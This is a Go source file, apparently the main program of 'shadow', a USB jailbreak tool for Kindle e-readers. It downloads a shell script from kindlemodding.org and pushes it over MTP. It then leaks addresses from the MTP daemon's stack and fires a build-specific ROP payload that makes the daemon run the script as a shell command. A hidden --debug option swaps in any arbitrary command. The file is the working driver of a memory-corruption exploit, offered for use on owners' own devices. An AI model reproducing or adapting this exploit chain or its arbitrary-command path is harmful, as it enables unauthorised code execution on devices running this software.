// Command shadow runs the Kindle jailbreak over USB, with the harvested
// firmware database embedded at build time.
package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"

	"shadow"
	"shadow/internal/banner"
	"shadow/internal/chain"
	"shadow/internal/fwdb"
	"shadow/internal/mtp"
	"shadow/internal/usbdev"
)

const (
	kindleVID      = 0x1949
	defaultPID     = 0x9981
	waitTries      = 90
	jbURL          = "https://kindlemodding.org/jb.sh"
	jbName         = "jb.sh"
	jbPath         = "/mnt/base-us/" + jbName
	maxScriptBytes = 32 << 20
	replugTimeout  = 120 * time.Second
)

// logPath is where --debug mirrors the trace.
var logPath = filepath.Join(os.TempDir(), "shadow.log")

var jbCommand = "RUN_MODE=1 /bin/sh " + jbPath

var httpClient = &http.Client{Timeout: 30 * time.Second}

var buildKeyRE = regexp.MustCompile(`^[0-9]{10}$`)

func main() {
	os.Exit(run())
}

func run() int {
	debug, debugCmd, rest := splitDebug(os.Args[1:])
	fs := flag.NewFlagSet("shadow", flag.ContinueOnError)
	var dryRun bool
	fs.BoolVar(&dryRun, "dry-run", false, "run the leak and print addresses without firing")
	fs.Usage = usage
	if err := fs.Parse(rest); err != nil {
		if errors.Is(err, flag.ErrHelp) {
			return 0
		}
		return 2
	}
	tr := newTracer(debug)
	defer tr.Close()

	banner.Print(os.Stdout)

	if fs.NArg() > 0 {
		switch cmd := fs.Args()[0]; cmd {
		case "doctor":
			return runDoctor(tr)
		case "restore-driver":
			return runRestoreDriver(fs.Args()[1:])
		default:
			fmt.Printf("\n  Unknown command %q.\n\n", cmd)
			usage()
			return 2
		}
	}

	if err := checkPrivileges(); err != nil {
		fmt.Printf("\n%v\n", err)
		fmt.Println(rerunHint())
		return 1
	}

	db, err := fwdb.Load(shadow.FirmwareDB)
	if err != nil {
		fmt.Printf("\nshadow is broken: %v\n", err)
		return 1
	}

	rec, ok := promptBuild(os.Stdin, os.Stdout, db)
	if !ok {
		return 1
	}

	cmd := debugCmd
	var scriptData []byte
	if cmd == "" && !dryRun {
		fmt.Println("\n  Fetching the jailbreak script (kindlemodding.org)...")
		data, err := fetchScript(jbURL, httpClient)
		if err != nil {
			fmt.Printf("\nCould not download the jailbreak script: %v\n", err)
			fmt.Println("Check this computer's internet connection and run shadow again.")
			return 1
		}
		sum := sha256.Sum256(data)
		fmt.Printf("  %s: %d bytes, sha256 %s\n", jbName, len(data), hex.EncodeToString(sum[:]))
		scriptData = data
		cmd = jbCommand
	}
	tr.Log("build=%s cmd=%q dry_run=%v", rec.BuildKey, cmd, dryRun)
	if tr.enabled {
		fmt.Printf("    verbose log: %s\n", logPath)
	}

	idx := 0
	next := func(format string, args ...any) {
		idx++
		step(idx, format, args...)
	}
	detect := func(u *usbdev.Transport) {
		next("Kindle detected (%s)", u.Describe())
	}

	fmt.Printf("\n  Build   %s  %s\n", rec.BuildKey, rec.Pretty())
	fmt.Printf("  Device  %s\n\n", strings.Join(rec.Models, ", "))
	fmt.Println("  Plug the Kindle into this computer with a USB data cable.")
	fmt.Println("\n  Waiting for the Kindle...")

	usbTr, c, err := connect(rec, tr, detect)
	if err != nil {
		fmt.Printf("\nCould not reach the Kindle: %v\n", err)
		fmt.Println("Unplug the Kindle, plug it back in, and run shadow again.")
		return 1
	}
	next("MTP session established")

	params, err := paramsOf(rec)
	if err != nil {
		usbTr.Close()
		fmt.Printf("\n%v\n", err)
		return 1
	}

	// The leak reads stack residue on the transport thread, and a
	// multi-megabyte SendObject data phase overwrites it: push the script in a
	// throwaway session, then restart the daemon with a replug before firing.
	if scriptData != nil {
		replaced, err := c.PutFile(jbName, scriptData)
		if err != nil {
			usbTr.Close()
			fmt.Printf("\nThe jailbreak script could not be transferred to the Kindle: %v\n", err)
			fmt.Println("Unplug the Kindle, plug it back in, and run shadow again.")
			return 1
		}
		if replaced {
			tr.Log("replaced existing %s", jbName)
		}
		next("Payload script transferred (%s, %d bytes)", jbPath, len(scriptData))

		usbTr.Close()
		fmt.Println("\n  The script is on the Kindle. The exploit needs a fresh device daemon,")
		fmt.Println("  so unplug the USB cable and plug it back in.")
		fmt.Println("\n  Waiting for the Kindle to be disconnected and reconnected...")
		if err := waitForReplug(rec, tr, replugTimeout); err != nil {
			fmt.Printf("\n%v\n", err)
			return 1
		}
		fmt.Println()
		usbTr, c, err = connect(rec, tr, detect)
		if err != nil {
			fmt.Printf("\nCould not reach the Kindle: %v\n", err)
			fmt.Println("Unplug the Kindle, plug it back in, and run shadow again.")
			return 1
		}
		next("MTP session established")
	}
	defer usbTr.Close()

	hit, err := chain.Harvest(c, params, tr.Log)
	if err != nil {
		tr.Log("harvest failed: %v", err)
		fmt.Println("\nThe exploit did not get a clean address leak this attempt.")
		fmt.Println("Unplug the Kindle, wait a moment, plug it back in,")
		fmt.Println("and run shadow again.")
		return 2
	}
	pie, s, err := chain.Solve(hit, params)
	if err != nil {
		fmt.Printf("\nLeak sanity check failed: %v\n", err)
		return 2
	}
	next("Address leak collected")
	tr.Log("leak: pie_word=%#x p16=%#x -> PIE=%#x S=%#x", hit.PieWord, hit.P16, pie, s)

	if dryRun {
		fmt.Printf("\n  dry run: leak=%s PIE=%#x S=%#x (not firing)\n", hit.Tag, pie, s)
		return 0
	}

	pl, err := chain.BuildPayload(pie, s, params, cmd)
	if err != nil {
		fmt.Printf("\n%v\n", err)
		return 1
	}
	tr.Log("cmd=%q str@%#x N=%d", cmd, pl.StrAddr, pl.N)

	if err := chain.Fire(c, chain.DefaultFillers, pl, tr.Log); err != nil {
		fmt.Printf("\nSending the payload failed: %v\n", err)
		fmt.Println("Unplug the Kindle, plug it back in, and run shadow again.")
		return 1
	}
	next("Payload delivered")

	if _, err := c.GetDeviceInfo(2 * time.Second); err != nil {
		tr.Log("daemon gone after fire (expected post-call abort)")
	} else {
		tr.Log("daemon still answering after fire")
	}

	fmt.Println("\n  Done. The jailbreak script is now running on your Kindle.")
	fmt.Println("  Keep the Kindle plugged in until it finishes.")
	fmt.Println("  A reboot is expected at the end.")
	fmt.Println("  If nothing happens on the Kindle, the build number you entered does not")
	fmt.Println("  match its firmware: the chain is aimed at build-specific addresses, so a")
	fmt.Println("  mismatch delivers the payload without running anything. Compare the")
	fmt.Println("  Device line above with the model you actually have.")
	fmt.Println()
	return 0
}

// splitDebug removes --debug from args, keeping it out of the flag set so it
// stays unlisted in usage. --debug CMD or --debug=CMD also overrides the
// payload command.
func splitDebug(args []string) (debug bool, cmd string, rest []string) {
	rest = make([]string, 0, len(args))
	for i := 0; i < len(args); i++ {
		switch a := args[i]; {
		case a == "--debug" || a == "-debug":
			debug = true
			if i+1 < len(args) && !strings.HasPrefix(args[i+1], "-") {
				cmd = args[i+1]
				i++
			}
		case strings.HasPrefix(a, "--debug=") || strings.HasPrefix(a, "-debug="):
			debug = true
			cmd = a[strings.IndexByte(a, '=')+1:]
		default:
			rest = append(rest, a)
		}
	}
	return debug, cmd, rest
}

func usage() {
	// doctor claims the interface too, so on Unix it needs the same privileges
	// as the exploit.
	prefix := elevationPrefix()
	fmt.Fprintf(os.Stderr, "shadow - Kindle jailbreak (USB only)\n\n")
	fmt.Fprintf(os.Stderr, "usage:\n")
	fmt.Fprintf(os.Stderr, "  %s%s [--dry-run] [--debug [CMD]]\n", prefix, os.Args[0])
	fmt.Fprintf(os.Stderr, "  %s%s doctor\n", prefix, os.Args[0])
	fmt.Fprintf(os.Stderr, "  %s restore-driver [--purge]   (Windows)\n\n", os.Args[0])
	fmt.Fprintln(os.Stderr, "Without a command, shadow asks for the Kindle build number, waits for the")
	fmt.Fprintln(os.Stderr, "device, then runs the exploit. doctor checks USB access and the driver")
	fmt.Fprintln(os.Stderr, "binding; on Windows restore-driver undoes the WinUSB binding Zadig installs.")
}

func step(i int, format string, args ...any) {
	fmt.Printf("  [%d] %s\n", i, fmt.Sprintf(format, args...))
}

// waitForReplug blocks until the Kindle leaves the bus and comes back, which
// restarts the device daemon (and its stack state).
func waitForReplug(rec fwdb.Record, tr *tracer, timeout time.Duration) error {
	vid, pids := usbIDs(rec)
	start := time.Now()
	deadline := start.Add(timeout)
	gone := false
	hinted := false
	for time.Now().Before(deadline) {
		if usbdev.Present(vid, pids) {
			if gone {
				tr.Log("kindle reconnected")
				return nil
			}
			if !hinted && time.Since(start) > 15*time.Second {
				fmt.Println("  (the Kindle is still connected; unplug the USB cable now)")
				hinted = true
			}
		} else if !gone {
			gone = true
			tr.Log("kindle disconnected")
		}
		time.Sleep(500 * time.Millisecond)
	}
	return fmt.Errorf("timed out waiting for the Kindle to be reconnected (run shadow again when it is plugged in)")
}

// promptBuild reads and validates the 10-digit build key.
func promptBuild(in io.Reader, out io.Writer, db fwdb.DB) (fwdb.Record, bool) {
	r := bufio.NewReader(in)
	for {
		fmt.Fprint(out, "\nEnter your Kindle's build number (10 digits): ")
		line, err := r.ReadString('\n')
		if err != nil && line == "" {
			fmt.Fprintln(out, "\nNo build number entered.")
			return fwdb.Record{}, false
		}
		key := strings.TrimSpace(line)
		if !buildKeyRE.MatchString(key) {
			fmt.Fprintln(out, "  That does not look like a 10-digit build number.")
			continue
		}
		rec, ok := db.Get(key)
		if !ok {
			fmt.Fprintf(out, "  Build %s is not in shadow's firmware database.\n", key)
			printKnown(out, db)
			continue
		}
		if err := rec.ExploitError(); err != nil {
			fmt.Fprintf(out, "\n  Build %s (%s) cannot be exploited by shadow:\n", rec.BuildKey, rec.Pretty())
			for _, p := range strings.Split(err.Error(), "; ") {
				fmt.Fprintf(out, "    - %s\n", p)
			}
			fmt.Fprintln(out, "\n  This firmware is recorded as unsupported.")
			return fwdb.Record{}, false
		}
		return rec, true
	}
}

func printKnown(out io.Writer, db fwdb.DB) {
	fmt.Fprintln(out, "\n  Known builds:")
	for _, rec := range db.Usable() {
		fmt.Fprintf(out, "    %s\n", rec.Label())
	}
	fmt.Fprintln(out)
}

// connect waits for the Kindle, claims it and establishes an MTP session.
// onDetect fires once, the first time the device is claimed.
func connect(rec fwdb.Record, tr *tracer, onDetect func(*usbdev.Transport)) (*usbdev.Transport, *mtp.Client, error) {
	vid, pids := usbIDs(rec)
	var lastErr error
	detected := false
	clearedBusy := false
	for attempt := 1; attempt <= waitTries; attempt++ {
		usbTr, err := usbdev.Open(vid, pids, tr.Log)
		if err != nil {
			lastErr = err
			if !clearedBusy && usbdev.IsBusy(err) {
				clearedBusy = true
				if argv := usbdev.BusyClearCommand(); len(argv) > 0 {
					fmt.Printf("\n  Another program is holding the Kindle; running %s.\n",
						strings.Join(argv, " "))
					usbdev.ClearBusy(argv, tr.Log)
				}
			}
			if attempt%30 == 0 {
				fmt.Printf("  ... still waiting (%ds)\n", attempt)
			}
			time.Sleep(time.Second)
			continue
		}
		if !detected {
			if onDetect != nil {
				onDetect(usbTr)
			}
			detected = true
		}
		client := mtp.New(usbTr, tr.Log)
		if err := setupSession(client); err != nil {
			lastErr = err
			tr.Log("session setup: %v", err)
			usbTr.Close()
			time.Sleep(time.Second)
			continue
		}
		return usbTr, client, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no device")
	}
	return nil, nil, lastErr
}

// setupSession discards stale state, opens a session and warms up the data
// phase.
func setupSession(c *mtp.Client) error {
	time.Sleep(500 * time.Millisecond)
	if _, err := c.Command(mtp.OpCloseSession, nil, 1, 600*time.Millisecond); err != nil {
		return err
	}
	if _, err := c.GetDeviceInfo(600 * time.Millisecond); err != nil {
		return err
	}
	if err := c.OpenSession(1); err != nil {
		return err
	}
	if _, err := c.GetDeviceInfo(time.Second); err != nil {
		return err
	}
	return c.Warmup(6)
}

// fetchScript downloads the jailbreak script. The Kindle's WiFi dies in MTP
// mode, so the host has to fetch it.
func fetchScript(url string, client *http.Client) ([]byte, error) {
	if client == nil {
		client = httpClient
	}
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "shadow-"+runtime.GOOS)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("%s: HTTP %s", url, resp.Status)
	}
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxScriptBytes+1))
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("%s: empty script", url)
	}
	if len(data) > maxScriptBytes {
		return nil, fmt.Errorf("%s: script larger than %d bytes", url, maxScriptBytes)
	}
	if len(data) < 2 || data[0] != '#' || data[1] != '!' {
		return nil, fmt.Errorf("%s: response does not start with #! (not a shell script)", url)
	}
	return data, nil
}

func usbIDs(rec fwdb.Record) (uint16, []uint16) {
	vid := uint16(kindleVID)
	if v, err := strconv.ParseUint(strings.TrimPrefix(rec.USB.VID, "0x"), 16, 16); err == nil && v != 0 {
		vid = uint16(v)
	}
	var pids []uint16
	for _, p := range rec.USB.PIDs {
		if v, err := strconv.ParseUint(strings.TrimPrefix(p, "0x"), 16, 16); err == nil && v != 0 {
			pids = append(pids, uint16(v))
		}
	}
	if len(pids) == 0 {
		pids = []uint16{defaultPID}
	}
	return vid, pids
}

func paramsOf(rec fwdb.Record) (chain.Params, error) {
	o := rec.Offsets
	if o.StackDelta == nil || rec.Leak.AnchorLow12 == nil {
		return chain.Params{}, fmt.Errorf("record %s is missing chain constants", rec.BuildKey)
	}
	conv := func(name string, v int64) (uint32, error) {
		if v <= 0 || v > 0xffffffff {
			return 0, fmt.Errorf("record %s: %s out of range (%d)", rec.BuildKey, name, v)
		}
		return uint32(v), nil
	}
	var p chain.Params
	var err error
	if p.System, err = conv("system", o.System); err != nil {
		return p, err
	}
	if p.PopGadget, err = conv("pop_gadget", o.PopGadget); err != nil {
		return p, err
	}
	if p.LdrBlxGadget, err = conv("ldr_blx_gadget", o.LdrBlxGadget); err != nil {
		return p, err
	}
	if p.GotBase, err = conv("got_base", o.GotBase); err != nil {
		return p, err
	}
	if p.StackDelta, err = conv("stack_delta", *o.StackDelta); err != nil {
		return p, err
	}
	if p.AnchorLow12, err = conv("anchor_low12", *rec.Leak.AnchorLow12); err != nil {
		return p, err
	}
	p.Slot4RawOff = rec.Leak.Slot4RawOff
	p.Slot16RawOff = rec.Leak.Slot16RawOff
	return p, nil
}

// tracer writes verbose trace lines to stdout and a log file.
type tracer struct {
	enabled bool
	f       *os.File
}

func newTracer(enabled bool) *tracer {
	t := &tracer{enabled: enabled}
	if enabled {
		if f, err := os.OpenFile(logPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644); err == nil {
			t.f = f
		}
	}
	return t
}

func (t *tracer) Log(format string, args ...any) {
	if t == nil || !t.enabled {
		return
	}
	line := fmt.Sprintf(format, args...)
	fmt.Printf("    %s\n", line)
	if t.f != nil {
		fmt.Fprintf(t.f, "%s %s\n", time.Now().Format(time.RFC3339), line)
	}
}

func (t *tracer) Close() {
	if t.f != nil {
		t.f.Close()
	}
}

// allUSBIDs returns the vid and the union of PIDs in the database, so doctor
// can find any supported Kindle before a build key is known.
func allUSBIDs(db fwdb.DB) (uint16, []uint16) {
	vid := uint16(kindleVID)
	seen := make(map[uint16]bool)
	for _, rec := range db.All() {
		if v, err := strconv.ParseUint(strings.TrimPrefix(rec.USB.VID, "0x"), 16, 16); err == nil && v != 0 {
			vid = uint16(v)
		}
		for _, p := range rec.USB.PIDs {
			if v, err := strconv.ParseUint(strings.TrimPrefix(p, "0x"), 16, 16); err == nil && v != 0 {
				seen[uint16(v)] = true
			}
		}
	}
	if len(seen) == 0 {
		seen[defaultPID] = true
	}
	pids := make([]uint16, 0, len(seen))
	for p := range seen {
		pids = append(pids, p)
	}
	sort.Slice(pids, func(i, j int) bool { return pids[i] < pids[j] })
	return vid, pids
}

// runDoctor reports the driver bound to each Kindle devnode (Windows), what
// libusb sees, and whether the interface can be claimed. It changes no device
// state, so it is safe before and after the WinUSB binding.
func runDoctor(tr *tracer) int {
	db, err := fwdb.Load(shadow.FirmwareDB)
	if err != nil {
		fmt.Printf("\nshadow is broken: %v\n", err)
		return 1
	}
	vid, pids := allUSBIDs(db)
	fmt.Printf("\n  Checking USB access to the Kindle (vid %#04x, pid %s).\n", vid, usbdev.PIDList(pids))

	nodes, err := usbdev.DriverNodes(vid, pids)
	if err != nil {
		tr.Log("driver probe failed: %v", err)
	}
	if len(nodes) > 0 {
		fmt.Println("\n  Windows driver bindings:")
		for _, n := range nodes {
			service := n.Service
			if service == "" {
				service = "no driver"
			}
			state := "not usable by libusb"
			if n.Bound {
				state = "libusb-compatible"
			}
			iface := "device"
			if n.MI >= 0 {
				iface = fmt.Sprintf("interface %d", n.MI)
			}
			fmt.Printf("    %s  %s  %s (%s)\n", n.InstanceID, service, state, iface)
		}
	}

	devs, err := usbdev.Enumerate(vid, pids)
	if err != nil {
		fmt.Printf("\n  USB enumeration failed: %v\n", err)
		return 1
	}
	if len(devs) == 0 {
		fmt.Println("\n  libusb sees no Kindle.")
		doctorRemedy()
		return 1
	}
	for _, d := range devs {
		fmt.Printf("\n  %04x:%04x bus %d addr %d config %d", d.VID, d.PID, d.Bus, d.Addr, d.Config)
		if d.Serial != "" {
			fmt.Printf(" serial %s", d.Serial)
		}
		fmt.Println()
		for _, intf := range d.Interfaces {
			mark := " "
			if intf.Selected {
				mark = "*"
			}
			fmt.Printf("    %s interface %d alt %d class %s\n", mark, intf.Number, intf.Alternate, intf.ClassString())
			for _, ep := range intf.Endpoints {
				used := " "
				if ep.Chosen {
					used = ">"
				}
				fmt.Printf("        %s %s\n", used, ep)
			}
		}
	}

	// The claim is the gate the exploit needs; Open also drains both IN
	// endpoints and tears them down again on Close.
	u, err := usbdev.Open(vid, pids, tr.Log)
	if err != nil {
		fmt.Printf("\n  claim failed: %v\n", err)
		switch {
		case windowsDriverRemedy(nodes):
			// Explained in terms of the driver bindings printed above.
		case permissionError(err):
			if hint := rerunHint(); hint != "" {
				fmt.Println(" ", hint)
			} else if runtime.GOOS == "windows" {
				fmt.Println("\n  WinUSB is bound but the claim was still denied: run shadow from an")
				fmt.Println("  Administrator prompt (the driver's security descriptor may need it).")
			}
		}
		return 1
	}
	defer u.Close()
	fmt.Printf("\n  claim ok: %s\n", u.Describe())
	fmt.Println("  USB access is ready. Run shadow without arguments to jailbreak this Kindle.")
	return 0
}

// windowsDriverRemedy explains a Windows claim failure in terms of the driver
// bindings doctor printed, and reports whether it did. libusb can only claim a
// devnode whose driver is WinUSB, so a Kindle on its stock WUDFWpdMtp driver is
// enumerable but not claimable.
func windowsDriverRemedy(nodes []usbdev.DriverNode) bool {
	if runtime.GOOS != "windows" || len(nodes) == 0 {
		return false
	}
	service := "another driver"
	for _, n := range nodes {
		if n.Bound {
			return false
		}
		if n.Service != "" {
			service = n.Service
		}
	}
	fmt.Printf("\n  The Kindle is on %s, not WinUSB, so libusb can enumerate it but not\n", service)
	fmt.Println("  claim it. Bind WinUSB to it once (admin, ~30 s):")
	zadigSteps()
	return true
}

// permissionError reports whether a claim failure looks like missing privileges
// rather than a device another program holds.
func permissionError(err error) bool {
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "access") || strings.Contains(msg, "permission") || strings.Contains(msg, "privilege")
}

// doctorRemedy prints the per-OS next step when libusb cannot see the Kindle.
func doctorRemedy() {
	if runtime.GOOS != "windows" {
		fmt.Println("\n  Plug the Kindle in with a USB data cable, then run shadow doctor again.")
		return
	}
	fmt.Println("\n  On Windows that means the Kindle is either not connected, or")
	fmt.Println("  bound to a driver libusb cannot use. Binding WinUSB (admin, ~30 s):")
	zadigSteps()
}

// zadigSteps prints the one-time WinUSB binding recipe. The Kindle is a single
// non-composite device, so Zadig lists it without an &MI_ suffix.
func zadigSteps() {
	fmt.Println("    1. Run Zadig (https://zadig.akeo.ie) as administrator.")
	fmt.Println("    2. Options -> List All Devices.")
	fmt.Println("    3. Pick the Kindle entry (1949:9981) showing endpoints 0x01/0x81/0x82.")
	fmt.Println("    4. Target driver WinUSB -> Replace Driver.")
	fmt.Println("    5. Run shadow doctor again.")
	fmt.Println()
	fmt.Println("  The binding persists across replugs and reboots. Undo it later with")
	fmt.Println("  shadow restore-driver; MTP file transfer stays broken until you do.")
}

// runRestoreDriver undoes the WinUSB binding Zadig installs, so Windows goes
// back to its normal Kindle driver and MTP file transfer works again.
func runRestoreDriver(args []string) int {
	fs := flag.NewFlagSet("restore-driver", flag.ContinueOnError)
	purge := fs.Bool("purge", false, "also uninstall the WinUSB driver package Zadig installed")
	if err := fs.Parse(args); err != nil {
		if errors.Is(err, flag.ErrHelp) {
			return 0
		}
		return 2
	}
	if runtime.GOOS != "windows" {
		fmt.Printf("\n  restore-driver is Windows-only: %s needs no driver step.\n", runtime.GOOS)
		return 2
	}
	db, err := fwdb.Load(shadow.FirmwareDB)
	if err != nil {
		fmt.Printf("\nshadow is broken: %v\n", err)
		return 1
	}
	vid, pids := allUSBIDs(db)
	removed, err := usbdev.RemoveDriverNodes(vid, pids, *purge)
	for _, n := range removed {
		fmt.Printf("  removed %s (%s)\n", n.InstanceID, n.Service)
	}
	if err != nil {
		fmt.Printf("\n  %v\n", err)
		fmt.Println("  Run shadow from an Administrator prompt and try again.")
		return 1
	}
	if len(removed) == 0 {
		fmt.Println("\n  No WinUSB-bound Kindle interface found, nothing to restore.")
		return 0
	}
	fmt.Println("\n  Windows has dropped the WinUSB binding: the Kindle is back on its normal")
	fmt.Println("  driver and MTP file transfer works again. Run Zadig again to jailbreak.")
	return 0
}
